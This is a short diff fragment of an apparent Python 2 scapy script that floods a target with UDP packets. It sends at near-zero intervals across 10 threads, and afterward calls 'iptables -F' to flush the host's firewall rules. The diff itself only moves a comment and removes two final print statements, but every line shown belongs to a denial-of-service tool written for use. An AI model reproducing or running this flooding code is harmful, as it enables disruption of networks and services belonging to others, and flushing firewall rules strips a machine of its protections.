@@ -108,7 +108,7 @@ while 1:
                 Attack = send(udpAttack, inter=0.00000001, verbose=0)
                 Attack
         
-	# Threading: Send 10 simultaneous packets * (range of updAttk function.)
+# Threading: Send 10 simultaneous packets * (range of updAttk function.)
         for i in range(10):
             t = Thread(target=udpAttk, args=(i,))
             t.start()
@@ -131,6 +131,3 @@ while 1:
 
     os.system('iptables -F')
     print '\nOption Finished'
-
-print '\nEnd Script'
-print '------------'
